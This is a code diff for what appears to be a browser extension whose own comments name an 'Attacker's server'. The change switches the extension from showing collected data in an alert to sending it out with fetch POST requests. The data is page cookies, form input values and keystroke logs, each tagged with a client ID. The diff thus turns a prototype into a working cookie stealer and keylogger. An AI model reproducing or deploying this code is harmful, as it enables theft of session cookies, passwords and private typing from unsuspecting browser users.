@@ -1,34 +1,19 @@
-/* attacker pseudo-database / server */
-var host_url = "http://127.0.0.1:41775/"
+/* Attacker's server */
+var host_url = "http://127.0.0.1:3000/"
 
-/* Get stored UUID */
-// var clientID;
-// chrome.storage.local.get(['id'],function(result){
-//     if (result) { 
-//         clientID = result; 
-//     } else {
+/* Get the client ID that retrieved from server on install */
+var clientID;
+chrome.storage.local.get(['id'],function(result){ clientID = result.id });
 
-//     };
-// });
-
-
-// function getClientID() {
-//     var get = new XMLHttpRequest();
-//     get.open("GET",url+'create');
-// }
-
-
-// function PostTo(endpoint,request) {
-//     var cur = new XMLHttpRequest();
-//     cur.open("POST",url+endpoint);
-//     cur.setRequestHeader("Content-Type","application/json");
-//     cur.send(JSON.stringify(request));
-// }
-
-/* Timestamp Strings */
-function createTimestamp() {
-    var now = new Date();
-    return now.getDate()+'-'+(now.getMonth()+1)+'-'+now.getFullYear()+' '+now.getHours()+':'+now.getMinutes()+':'+now.getSeconds();
+/* Given a host endpoint and a body, make a request */
+function PostTo(endpoint,request) {
+    fetch(host_url+endpoint, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(request)
+    });
 }
 
 
@@ -50,12 +35,12 @@ function saveAndSendC() {
     if (!document.cookie) { return; }
     /* output JSON */
     var curCookies = {}
-    curCookies['timestamp'] = createTimestamp();
     curCookies['url'] = document.URL;
+    curCookies['id'] = clientID;
     curCookies['title'] = document.title;
     curCookies['cookies'] = document.cookie;
-    alert(JSON.stringify(curCookies));
-    // PostTo('add/cookies',curCookies);
+    // alert(JSON.stringify(curCookies)); // placeholder
+    PostTo('add/cookies',curCookies);
 }
 
 
@@ -80,7 +65,7 @@ function saveAndSendIF(target) {
     if (!target.value) { return; }
     /* output JSON */
     var curInput = {} 
-    curInput['timestamp'] = createTimestamp();
+    curInput['id'] = clientID;
     curInput['url'] = document.URL;
     curInput['title'] = document.title;
     curInput['type'] = target.name;
@@ -138,7 +123,7 @@ function saveAndSendKS() {
     if (curlog.length === 0) { return; }
     /* output JSON */
     var curMessage = {} 
-    curMessage['timestamp'] = createTimestamp();
+    curMessage['id'] = clientID;
     curMessage['url'] = document.URL;
     curMessage['title'] = document.title;
     /* Set and clear log */
